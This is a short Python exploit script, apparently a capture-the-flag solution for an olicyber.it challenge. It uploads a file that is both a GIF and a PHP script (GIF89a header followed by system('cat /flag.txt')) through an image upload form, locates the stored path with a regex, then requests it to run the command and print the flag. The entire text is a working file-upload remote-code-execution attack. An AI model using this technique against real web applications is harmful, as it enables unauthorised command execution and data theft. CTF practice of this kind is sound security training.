#!/usr/bin/env python3 
import requests, re

payload = 'GIF89a;\n<?php echo system("cat /flag.txt"); ?>'
site = "http://got-magic.challs.olicyber.it/"

with open("flag.php.gif", "w") as file:
    file.write(payload)
file = {'image':open("flag.php.gif", "r")}

r = requests.post(site, files=file, data={"submit" : "Upload"})
pattern = "uploads\/[0-9]*flag.php.gif"
newUrl = re.findall(pattern, r.text)[0]
r = requests.get(site + newUrl)
print(r.text.split()[1])
